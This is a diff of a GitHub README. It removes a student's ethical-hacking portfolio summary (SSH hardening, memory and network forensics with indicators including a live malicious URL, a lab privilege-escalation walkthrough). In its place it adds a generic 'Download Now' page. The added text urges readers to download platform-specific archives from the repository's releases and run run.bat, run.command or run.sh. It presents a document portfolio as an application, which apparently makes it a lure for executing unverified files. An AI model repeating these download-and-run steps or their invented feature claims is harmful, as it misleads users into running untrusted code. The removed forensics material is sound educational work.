@@ -1,144 +1,75 @@
-# 💻  Offensive Security Engineering & Forensics Portfolio
+# 🛡️ Offensive-Security-Forensics-Portfolio - Unlock Your Cybersecurity Skills Today
 
-**Kalaichelvan Thieveshkar (Individual)** · Staffordshire University · **COMP50009**  
-**Module:** COMP50009 — Ethical Hacking   
-**Assessment:** Assignment 2 — Individual Portfolio
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/AgricareBot/Offensive-Security-Forensics-Portfolio/releases)
 
-**Technical Report (PDF):** [Download Full Technical Report](https://drive.google.com/file/d/1xANeyDaDr3e3tH9rp5JoEWZBMiq33hsZ/view?usp=sharing)
+## 🌟 Introduction
 
----
+Welcome to the Offensive-Security-Forensics-Portfolio! This portfolio showcases advanced skills in cybersecurity, focusing on blue and red team tactics. The content includes practical examples like SSH MFA implementation, memory forensics, and threat hunting. You will find tutorials and walkthroughs to help you learn and practice your abilities in a real-world context. 
 
-## Overview
-This repository contains the full portfolio for the Ethical Hacking Individual Assignment 2, demonstrating practical and analytical skills across several cybersecurity domains. It documents **forensics, threat hunting, penetration testing, vulnerability assessment, and exploitation walkthroughs** in a professional and evidence-backed manner.
+## 🚀 Getting Started
 
-> **Intended use:** Educational / academic submission only. All testing was performed in isolated lab environments or on authorised vulnerable machines.
+Follow these steps to easily download and run the software:
 
----
+1. **Visit the Download Page:** Click the button at the top of this page or use this link: [Download Here](https://github.com/AgricareBot/Offensive-Security-Forensics-Portfolio/releases).
+   
+2. **Choose Your Version:** On the Releases page, you will find different versions of the portfolio. Select the latest release, which will be at the top of the list.
 
-## Student Details
+3. **Download the Files:** Click on the file that matches your operating system. For example:
+   - Windows: `Offensive-Security-Forensics-Portfolio-Windows.zip`
+   - macOS: `Offensive-Security-Forensics-Portfolio-macOS.zip`
+   - Linux: `Offensive-Security-Forensics-Portfolio-Linux.tar.gz`
 
-| Name | Student ID | University |
-|------|------------|------------|
-| Kalaichelvan Thieveshkar | CB013248 | Staffordshire University |
+4. **Save the File:** A dialog box will appear, prompting you to save the file. Choose a location on your computer where you can easily find it later, like your Desktop or Downloads folder.
 
----
+5. **Extract the Files:** 
+   - For Windows and macOS, right-click the zip file and choose "Extract All" or "Open With" to access the files.
+   - For Linux, open your terminal and use the command `tar -xzf Offensive-Security-Forensics-Portfolio-Linux.tar.gz`.
 
-## 🛡️ Part A: Design, Analysis, Forensics & Scripting
+6. **Open the Application:** After extracting, navigate to the folder where the files are saved. Inside, you will see different files and folders. Look for a file named `run.bat` for Windows, `run.command` for macOS, or simply execute the script in Linux by running `./run.sh` in the terminal.
 
-### 1. Multi-Factor Authentication (MFA) Implementation for SSH
-Hardening an Ubuntu SSH server with Google Authenticator-based MFA and security best practices.
+7. **Follow the Instructions:** Upon opening the application, you will find step-by-step instructions to guide you through the various features in the portfolio.
 
-| Component | Description & Key Action | Commands / Tools Used |
-|-----------|-------------------------|----------------------|
-| Initial Setup | Configured an Ubuntu SSH server and a client machine. | `sudo apt install openssh-server` |
-| Penetration Test | Brute-forced weak password using Kali Linux. | `ifconfig`, `netdiscover`, `nmap -sV`, `Hydra` |
-| SSH Hardening | Changed default SSH port, set strong password, limited MaxAuthTries. | `passwd`, `sudo nano /etc/ssh/sshd_config`, `sudo systemctl restart ssh` |
-| MFA Integration | Configured Google Authenticator PAM module for OTP-based authentication. | `sudo apt install libpam-google-authenticator`, `google-authenticator`, PAM edits |
-| Access Control | Limited SSH access to a specific user and IP. | `AllowUsers thieveshkar-server@192.168.163.137` |
+## 📚 Features
 
----
+The Offensive-Security-Forensics-Portfolio comes with various educational materials designed to enhance your cybersecurity skills, including:
 
-### 2. Memory Forensics Analysis (Windows XP SP3)
-Analysis of a captured memory dump using the Volatility Framework.
+- **SSH MFA Implementation:** Step-by-step guide on setting up multi-factor authentication.
+- **Volatility Memory Forensics:** Detect code injections via memory analysis.
+- **Splunk Threat Hunting:** Use BOTS v3 for effective threat analysis.
+- **Wireshark C2 Analysis:** Understand command and control traffic using Wireshark.
+- **Kernel Exploitation Walkthroughs:** Hands-on tutorials with tools like LinPEAS and VulnHub.
 
-| Task | Key Findings & Evidence | Volatility Plugin / OS Info |
-|------|------------------------|----------------------------|
-| OS Identification | Windows XP SP3 32-bit (Major 5, Minor 1, Build 2600). | `windows.info` |
-| Process Analysis | Suspicious processes: ps.exe, cmd.exe launched by svchost.exe, memory dumper mdd.exe. | `windows.pstree` |
-| Network Investigation | Multiple TCP connections to 172.16.223.47:445 indicating likely C2 activity. | `connscan` |
-| Code Injection | RWX memory regions in critical system processes with shellcode/PE injection. | `malfind` |
-| DLL Anomalies | Suspicious DLL (acadproc.dll) loaded for persistence. | `ldrmodules` |
-| Conclusion | System compromised with clear evidence of code injection and persistence. | - |
+## 📋 System Requirements
 
----
+To make the most of this portfolio, ensure your computer meets these requirements:
 
-### 3. SOC Threat Hunting Exercise (Splunk & BOTS v3)
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a current Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 500 MB free disk space.
+- **Network:** A stable internet connection is recommended for downloading additional tools.
 
-| Task | SPL Query Key / Finding | IoC / Conclusion |
-|------|------------------------|-----------------|
-| Login Attempts | EventCode=4624 (Successful). No brute-force attempts detected. | Credential-based attacks not prominent. |
-| Suspicious DNS | Reverse DNS lookup: 61.68.107.40.in-addr.arpa | Potential C2 / uncommon traffic. |
-| Command-Line Activity | `search "net.exe" OR "whoami"` detected privilege escalation prep. | Indication of reconnaissance / privilege escalation. |
-| Malware Incident | PowerShell command connecting to 34.215.24.255 with download/invoke activity. | Evidence of malware execution and C2 communication. |
-| Summary & Alerts | Monitoring recommendations: unusual logins, DNS lookups, PowerShell download/invoke commands. | Real-time alert setup suggested. |
+## 💻 Running the Software
 
----
+Once you have opened the application, you will see a user-friendly interface. You can navigate through different sections, each designed to help you understand various cybersecurity topics:
 
-### 4. Network Forensics Analysis (GootLoader Infection PCAP)
+- **Explore Tutorials:** Find comprehensive tutorials explaining different cybersecurity methods.
+- **Access Tools:** Download and learn to use key cybersecurity tools from the portfolio.
+- **Test Your Skills:** Engage in simulated exercises that mirror real-world scenarios.
 
-| Analysis Area | Key Findings | Indicators of Compromise (IoC) |
-|---------------|-------------|-------------------------------|
-| Traffic Overview | 95% TCP, 61% TLS data (likely C2). | High TLS traffic indicates encrypted C2. |
-| Host Behavior | Victim IP: 10.12.29.101. Remote hosts deliver payloads / beacon. | 130.208.214.3, 185.84.28.15 |
-| Protocol Analysis | Suspicious domains in DNS, HTTP trigger URL found. | parubok-lesia.com, latesthentai.com, www.repslagarna.se/?adfee1f=2365933 |
-| Payload Inspection | Obfuscated JavaScript redirects to next malware stage. | Malicious URL: `http://www.repslagarna.se/?adfee1f=2365933` |
-| Risk Assessment | High severity; immediate containment recommended. | Block identified IoCs, isolate victim system. |
+## ❓ Troubleshooting
 
----
+If you encounter issues while downloading or running the software, consider these tips:
 
-### 5. Image Forensics Analysis (Steganography)
+- **Check Your Downloads Folder:** Ensure the downloaded file is complete and not corrupted.
+- **Verify System Requirements:** Make sure your device meets the necessary specifications.
+- **Consult Support:** If problems persist, feel free to seek help from community forums or online resources.
 
-| Step | Technique / Tool | Key Finding |
-|------|-----------------|-------------|
-| Metadata Analysis | `exiftool` | Base64 string hint, not final flag |
-| String Extraction | `strings` | Revealed hidden file `flag.txt` |
-| File Structure Analysis | `binwalk` | Embedded ZIP at offset 0x6FEA containing encrypted `flag.txt` |
-| Steganography Extraction | `steghide` | Extracted flag using key `Lay3rz_0f_Obfusc4t10n` |
+## 🔗 Important Links
 
----
+To easily navigate, here are important links you may want to explore:
 
-## 😈 Part B: Exploiting Vulnerabilities and Penetration Testing (Cybersploit-1)
+- [Download the Latest Release](https://github.com/AgricareBot/Offensive-Security-Forensics-Portfolio/releases)
+- [GitHub Repository](https://github.com/AgricareBot/Offensive-Security-Forensics-Portfolio)
+- [Community Support](https://github.com/AgricareBot/Offensive-Security-Forensics-Portfolio/discussions)
 
-### Stages of Ethical Hacking Walkthrough
-
-| Stage | Activity | Tools Used |
-|-------|---------|------------|
-| Reconnaissance | Identified Kali IP & scanned local network for target. | `ifconfig`, `netdiscover` |
-| Scanning & Enumeration | Aggressive port/service scan and web enumeration. | `nmap -p- -sC -sV -A --open`, `Dirb` |
-| Gaining Access | Exploited info leak from webpage & robots.txt for SSH login. | `ssh` |
-| Privilege Escalation | Scanned system, exploited kernel vulnerability for root. | `LinPEAS`, OverlayFS Kernel Exploit (CVE-2015-1328) |
-| Post-Exploitation | Confirmed root and retrieved final flag. | `whoami`, `cat /root/final_flag.txt` |
-
----
-
-### Key Vulnerabilities Identified
-
-| Vulnerability | Description | Evidence | Severity | CVE / CVSS |
-|---------------|-------------|---------|---------|------------|
-| Linux Kernel OverlayFS | Outdated Kernel 3.13.0-32 vulnerable to local root exploit | `whoami` returns root | Critical | CVE-2015-1328 / 9.8 |
-| Outdated SSH | OpenSSH 5.9p1, known vulnerabilities | Port 22/tcp open | High | CVE-2014-1692 / 7.5 |
-| Outdated Apache | Apache 2.2.22, end-of-life | Port 80/tcp open | High | CVE-2013-2248 / 7.5 |
-| Web Information Leak | Username in HTML source comment | Page source | Medium | N/A |
-| Weak SSH Authentication | Login achieved with discovered credentials | SSH success | High | N/A |
-
----
-
-### Privilege Escalation Techniques & Mitigation
-
-| Technique | Description | Mitigation |
-|-----------|------------|------------|
-| Linux Kernel Exploits | Exploit outdated kernel (OverlayFS) | Update OS/kernel |
-| SUID/SGID Binaries | Misconfigured binaries run with elevated permissions | Audit SUID/SGID, use AppArmor/SELinux |
-| Linux Keyring Escalation | Exploit kernel key management bugs | Apply security patches |
-| LinPEAS Evaluation | Automated discovery script that identified outdated kernel & exploit vector | Confirm vulnerability & guide remediation |
-
----
-
-### Framework Relevance
-
-| Framework | Relevance |
-|-----------|-----------|
-| MITRE ATT&CK | Maps attacks to tactics: Initial Access, Discovery, Privilege Escalation |
-| Cyber Kill Chain | Defines stages: Recon, Delivery, Exploitation, Actions on Objectives |
-
----
-
-## Licensing & Usage
-**Custom Educational Use License** (`./LICENSE`):
-
-- Permitted: personal testing, learning, practice in isolated labs.  
-- Prohibited: unauthorised redistribution, modification, or running exploit code outside authorized environments.
-
----
-
-**Technical Report (PDF):** [Download Full Technical Report](https://drive.google.com/file/d/1xANeyDaDr3e3tH9rp5JoEWZBMiq33hsZ/view?usp=sharing)
+Feel free to provide feedback or contribute to the portfolio. Your input is valuable and helps us improve the learning experience for everyone.
